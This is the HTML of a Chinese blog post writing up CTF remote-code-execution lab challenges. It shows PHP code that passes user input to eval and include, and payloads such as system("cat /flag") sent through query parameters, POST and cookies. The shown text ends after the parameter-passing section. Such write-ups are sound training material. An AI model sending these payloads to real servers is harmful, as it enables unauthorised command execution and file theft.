@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/snowflake.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/snowflake.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/snowflake.svg">
+  <link rel="mask-icon" href="/images/snowflake.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"godice.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE_ 文件包含技能树连接ctf_show 的 RCE 的技能树代码执行&amp;命令执行代码执行&amp;命令执行参考文档特别注意：$_REQUEST是一个包含了$_GET、$_POST和$_COOKIE数据的超级...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF_Show_RCE技能树">
+<meta property="og:url" content="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html">
+<meta property="og:site_name" content="冰神的小屋">
+<meta property="og:description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE_ 文件包含技能树连接ctf_show 的 RCE 的技能树代码执行&amp;命令执行代码执行&amp;命令执行参考文档特别注意：$_REQUEST是一个包含了$_GET、$_POST和$_COOKIE数据的超级...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/a72122b8f61866a81cff769b349f9cd4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/dfd976a506d666a106e991989f0576a9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/c718a3edecb7c4219ef59e55d436de11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/f8acfc8e9e0d3a7ad9470c9031148a8a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/c18a84a91dc23b51d0a01d423b36310e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/6b8bf36f07298e2f2498d65ec0f66952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/74fbe6e3343548ba2cbc9408d7d3723e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/2ecd9beea6c02b7ff65d048d7802ac6e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/52aa1b1efd49c0ddd9725471acbaa261.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/712640a679f1db43bae4d7e97f148738.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/6209b28be1052c3e2017dc7cd582fdb2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/e48e488cf5583fef0eaa8eaa81dc7380.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/9040af0d06bc65d6f3b096d0e6496f0f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/921bd42306419c8c9740881ff3d6602f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/a69817371218805a3e7d0e129917fdce.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/47779600/1735526802877-2a64975c-3e94-458a-85fb-980756a4f890.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/10e8d2088fd6c08662109f597d393c76.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/c41eeb7164eab732ec7a844867c9671c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/0154974c874431a68af142db4d3c9332.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/1d03ab3db0b462b3d06b3b64638a8b2a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/ee7895c42b0cb9aa57d479663af9f74f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/23bf457dd4903a7a228df679bab2396f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/57f780141ba15ed8f1d8f62745570af9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/57e7dc1be14387c7dd5f58ea39ef5a76.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/2ca8e4cb4b6e3bfc516e452685494fc0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/0b2f567d3f02e0ffac00deada35a4bce.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/4cfb1655012c61c7b2f57ee46f37b0fb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/f86fc72290fcfb58bf8bd17f2f699f5a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/fdbdccc0ff92216ea53757af58fab637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/godicee/img/main/46f20236961707420b64e456768c818e.png">
+<meta property="article:published_time" content="2024-11-05T09:29:14.000Z">
+<meta property="article:modified_time" content="2024-12-30T11:29:23.000Z">
+<meta property="article:author" content="Godice">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png">
+
+
+<link rel="canonical" href="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html","path":"CTF_Show_RCE技能树.html","title":"CTF_Show_RCE技能树"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF_Show_RCE技能树 | 冰神的小屋</title>
+  
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="comments-eta-ten.vercel.app"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.css"><style>
+#needsharebutton-postbottom {
+  cursor: pointer;
+  height: 26px;
+  margin-top: 10px;
+  position: relative;
+}
+#needsharebutton-postbottom .btn {
+  border: 1px solid $btn-default-border-color;
+  border-radius: 3px;
+  display: initial;
+  padding: 1px 4px;
+}
+</style>
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="冰神的小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">冰神的小屋</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">24</span></a></li><li class="menu-item menu-item-coding+书单"><a href="/daily/" rel="section"><i class="fa fa-icons fa-fw"></i>Coding+书单</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header> 
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">RCE_ 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.</span> <span class="nav-text">代码执行&amp;命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aeval%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.</span> <span class="nav-text">题目：eval执行(代码执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.3.</span> <span class="nav-text">题目：文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F-get-post-cookie"><span class="nav-number">1.4.</span> <span class="nav-text">传参方式 get&#x2F;post&#x2F;cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aphp-input"><span class="nav-number">1.5.</span> <span class="nav-text">题目：php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.6.</span> <span class="nav-text">题目：读取源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="nav-number">1.7.</span> <span class="nav-text">题目：远程包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8Ballow-url-fopen-include"><span class="nav-number">1.8.</span> <span class="nav-text">远程allow_url_fopen&#x2F;include</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">RCE_ 命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-exec-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">题目：命令注入(exec 命令执行)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8-cat"><span class="nav-number">2.2.</span> <span class="nav-text">题目：禁用 cat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%A6%81%E7%94%A8%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.3.</span> <span class="nav-text">题目：禁用空格</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Godice" src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">Godice</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/Django%E7%9A%84Moba%E6%B8%B8%E6%88%8F.html" title="Django的Moba游戏.html">Django的Moba游戏</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/Djongo!Vue%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9F.html" title="Djongo!Vue指纹识别系统.html">Djongo/Vue指纹识别系统</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86Hexo+next%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA+%E8%AF%AD%E9%9B%80+github%E5%9B%BE%E5%BA%8A+elog%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E4%BC%A0+SEO%E4%BC%98%E5%8C%96+%E5%90%84%E7%A7%8D%E4%BC%98%E5%8C%96+leancloud+Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F.html" title="全网最详细Hexo+next博客搭建+语雀+github图床+elog全自动化上传+SEO优化+各种优化+leancloud+Waline评论系统.html">全网最详细Hexo+next博客搭建+语雀+github图床+elog全自动化上传+SEO优化+各种优化+leancloud+Waline评论系统</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/index.html" title="index.html">index</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html" title="b站视频学习.html">b站视频学习</a>
+        </li>
+    </ul>
+  </div>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+
+      <div class="twopeople">
+        <div class="container" style="height:200px;">
+            <canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas>
+        </div>
+        <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople1.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/zdog.dist.js"></script>
+        <script id="rendered-js" src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople.js"></script>
+        <style>
+            .twopeople{
+                margin: 0;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+            }
+            canvas {
+                display: block;
+                margin: 0 auto;
+                cursor: move;
+            }
+        </style>
+      </div>
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="Godice">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冰神的小屋">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF_Show_RCE技能树 | 冰神的小屋">
+      <meta itemprop="description" content="---title: CTF_Show_RCE技能树categories: CTF 相关---RCE_ 文件包含技能树连接ctf_show 的 RCE 的技能树代码执行&amp;命令执行代码执行&amp;命令执行参考文档特别注意：$_REQUEST是一个包含了$_GET、$_POST和$_COOKIE数据的超级...">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF_Show_RCE技能树
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-05 17:29:14" itemprop="dateCreated datePublished" datetime="2024-11-05T17:29:14+08:00">2024-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-12-30 19:29:23" itemprop="dateModified" datetime="2024-12-30T19:29:23+08:00">2024-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">CTF 相关</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">---title: CTF_Show_RCE技能树categories: CTF 相关---RCE_ 文件包含技能树连接ctf_show 的 RCE 的技能树代码执行&amp;命令执行代码执行&amp;命令执行参考文档特别注意：$_REQUEST是一个包含了$_GET、$_POST和$_COOKIE数据的超级...</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_ 文件包含"></a>RCE_ 文件包含</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p>
+<p>ctf_show 的 RCE 的技能树</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png"></p>
+<h3 id="代码执行-命令执行"><a href="#代码执行-命令执行" class="headerlink" title="代码执行&amp;命令执行"></a>代码执行&amp;命令执行</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/-qing-/p/10819069.html">代码执行&amp;命令执行参考文档</a></p>
+<p>特别注意：<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;$_REQUEST&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">是一个包含了</font><code>$_GET</code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code>$_POST</code><font style="color:rgba(0, 0, 0, 0.85);">和</font><code>$_COOKIE</code><font style="color:rgba(0, 0, 0, 0.85);">数据的超级全局变量</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<h3 id="题目：eval执行-代码执行"><a href="#题目：eval执行-代码执行" class="headerlink" title="题目：eval执行(代码执行)"></a>题目：eval执行(代码执行)</h3><p>ctf_show 题目</p>
+<p>一道基础题，但是有一个点需要注意的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接把 cmd 传参的内容当作 eval 的 php 代码执行</p>
+<p><code>?cmd=system(&quot;ls /&quot;);</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/a72122b8f61866a81cff769b349f9cd4.png"></p>
+<p><code>?cmd=system(&quot;cat /flag_7373&quot;)</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/dfd976a506d666a106e991989f0576a9.png"></p>
+<p><font style="color:#DF2A3F;">一个需要注意的点</font></p>
+<p>对于以下的代码都是可以的，只要在命令的部分没有空格（空格会被url编码%20，在浏览器传输到后端后会自动解码一次）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">system</span>(ls); ?cmd=<span class="title function_ invoke__">system</span>(pwd); ?cmd=<span class="title function_ invoke__">system</span>(whoami);</span><br></pre></td></tr></table></figure>
+
+<p>但是一旦有了空格，就执行不成功<code>?cmd=system(ls /);</code>而需要加上引号<code>?cmd=system(&quot;ls /&quot;);</code><img src="https://raw.githubusercontent.com/godicee/img/main/c718a3edecb7c4219ef59e55d436de11.png"></p>
+<h3 id="题目：文件包含"><a href="#题目：文件包含" class="headerlink" title="题目：文件包含"></a>题目：文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/f8acfc8e9e0d3a7ad9470c9031148a8a.png"></p>
+<p>文件如下，有 eval 代码执行</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/c18a84a91dc23b51d0a01d423b36310e.png"></p>
+<p>可以用 get、post、cookie 传参</p>
+<p>get 传参<code>?file=shell.txt&amp;ctfhub=system(&quot;cat /flag&quot;);</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/6b8bf36f07298e2f2498d65ec0f66952.png"></p>
+<p>post 传参</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/74fbe6e3343548ba2cbc9408d7d3723e.png"></p>
+<p>cookie 传参，这里 cookie 传参没有成功（猜测 Cookie 的逻辑没有写在服务器代码里，不知道，乱猜的）</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/2ecd9beea6c02b7ff65d048d7802ac6e.png"></p>
+<h3 id="传参方式-get-post-cookie"><a href="#传参方式-get-post-cookie" class="headerlink" title="传参方式 get&#x2F;post&#x2F;cookie"></a>传参方式 get&#x2F;post&#x2F;cookie</h3><p>get<code>?para1=xxx&amp;para2=xxx</code></p>
+<p>post</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /api/submit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: [根据实际内容长度填写]</span><br><span class="line"></span><br><span class="line">username=John&amp;password=<span class="number">123456</span>&amp;email=john@example.com</span><br></pre></td></tr></table></figure>
+
+<p>Cookie（多个参数用;分割，注意 Cookie 后的空格和分号后的空格分割）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Cookie: user_id=<span class="number">123</span>; username=John; role=admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/52aa1b1efd49c0ddd9725471acbaa261.png"></p>
